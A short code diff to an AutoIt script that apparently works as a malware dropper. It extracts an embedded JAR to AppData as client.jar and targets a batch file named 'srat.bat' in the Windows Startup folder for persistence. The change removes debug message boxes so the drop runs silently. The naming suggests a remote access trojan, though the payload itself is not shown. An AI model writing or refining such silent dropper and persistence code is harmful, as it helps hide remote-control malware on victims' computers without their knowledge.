@@ -5,10 +5,7 @@
 $jar_file = @AppDataDir & "\client.jar"
 
 If Not FileExists($jar_file) Then
-   MsgBox(0, "", $jar_file)
-   MsgBox(0, "", _ResourceGetAsStringW("JAR"))
    _ResourceSaveToFile($jar_file, "JAR", $RT_RCDATA, 0, 1)
-   MsgBox(0, "", @error)
 EndIf
 
 $bat_file = @AppDataDir & "\Microsoft\Windows\Start Menu\Programs\Startup\srat.bat"
